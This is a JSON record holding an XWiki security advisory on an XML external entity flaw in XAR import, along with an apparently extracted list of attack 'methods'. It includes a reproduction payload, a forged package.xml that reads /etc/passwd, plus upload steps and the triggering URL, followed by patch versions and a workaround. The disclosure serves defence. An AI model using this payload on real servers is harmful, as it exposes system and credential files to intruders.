{"description": "### Impact\nAny user with edit rights on a document can trigger a XAR import on a forged XAR file, leading to the ability to display the content of any file on the XWiki server host.\n\nExample to reproduce:\n* Create a forget XAR file and inside it, have the following `package.xml` content:\n  ```xml\n  <?xml version=\"1.0\" encoding=\"UTF-8\"?>\n  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>\n\n  <package>\n  <infos>\n  <name>&xxe;</name>\n  <description> &xxe; Helper pages for creating and listing Class/Template/Sheets</description>\n  <licence></licence>\n  <author>XWiki.Admin</author>\n  ...\n  ```\n* Upload it onto a wiki page (e.g. `XXE`) as an attachment (e.g. `test.xar`).\n* Call the page using `http://localhost:8080/xwiki/bin/view/Main/XXE?sheet=XWiki.AdminImportSheet&file=test.xar`\n\nYou'll then notice that the displayed UI contains the content of the `/etc/passwd` file.\n\n### Patches\nThe vulnerability has been patched in XWiki 13.10.11, 14.4.7 and 14.10-rc-1.\n\n### Workarounds\nYou'd need to get XWiki Platform sources and apply the changes from https://github.com/xwiki/xwiki-platform/commit/e3527b98fdd8dc8179c24dc55e662b2c55199434 to the `XarPackage` java class and then copy the modified version to your `WEB-INF/classes` directory (or rebuild the `xwiki-platform-xar-model` maven module and replace the one found in `WEB-INF/lib/`).\n\n### References\n* https://github.com/xwiki/xwiki-platform/commit/e3527b98fdd8dc8179c24dc55e662b2c55199434\n* https://jira.xwiki.org/browse/XWIKI-20320\n\n### For more information\nIf you have any questions or comments about this advisory:\n*    Open an issue in [Jira XWiki.org](https://jira.xwiki.org/)\n*    Email us at [Security Mailing List](mailto:security@xwiki.org)\n", "methods": ["Used XML External Entity (XXE) to display the content of any file on the XWiki server host.", "Triggers a XAR import on a forged XAR file.", "Uploads a forged XAR file onto a wiki page as an attachment.", "Calls a page using a crafted URL to trigger the XXE vulnerability.", "Uses a crafted `package.xml` content to inject the XXE payload.", "Uses a `file:///` URI to read the content of a local file."]}
